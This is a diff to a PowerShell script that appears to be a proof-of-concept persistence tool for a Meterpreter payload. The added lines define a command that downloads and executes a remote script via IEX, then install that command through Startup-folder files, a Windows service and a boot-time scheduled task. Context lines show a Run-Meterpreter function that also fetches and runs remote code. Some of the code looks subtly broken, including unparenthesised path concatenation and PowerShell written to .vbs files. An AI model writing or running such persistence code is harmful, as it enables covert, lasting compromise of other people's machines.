@@ -6,6 +6,8 @@
     [string]$elevate
 )
 
+$persist = "cmd.exe /c powershell.exe IEX (New-Object Net.Webclient).downloadstring('https://github.com/Gegitech/PowerShell-Persistence-POC/blob/master/persistence.ps1'); Run-Guard;"
+
 function Run-Meterpreter 
 {
     IEX (New-Object Net.Webclient).downloadstring(
@@ -33,6 +35,42 @@ function Run-Guard
             Run-Child $process
         }
     }
+}
+
+function Persist-StartUpFolder {
+    param($fileName)
+    try {
+        $persist | Out-File [Environment]::GetFolderPath('CommonStartup') + '\' + $fileName + '.vbs'
+    } catch {
+        $persist | Out-File [Environment]::GetFolderPath('Startup') + '\' + $fileName + '.vbs'
+    } 
+}
+
+function Persist-Service {
+    param($serviceName, $fileName)
+    try {
+        $persist | Out-File 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs'
+        New-Service -Name $serviceName -BinaryPathName 'C:\ProgramData\Microsoft\Windows\' + $fileName + '.vbs' -StartupType Automatic
+    } catch {
+        Write-Verbose "Failed to create Service"
+    }
+}
+
+function Persist-SchTask {
+    param($taskName, $description, $fileName )
+    try {
+        $path = [Environment]::GetFolderPath('ApplicationData') + '\' + $fileName + '.vbs'
+        $persist | Out-File $path
+        $action = New-ScheduledTaskAction -Execute $path
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $description
+    } catch {
+        Write-Verbose "Failed to create Task"
+    }
+}
+
+function Persist-AutoRun {
+    
 }
 
 if ($persistence) {
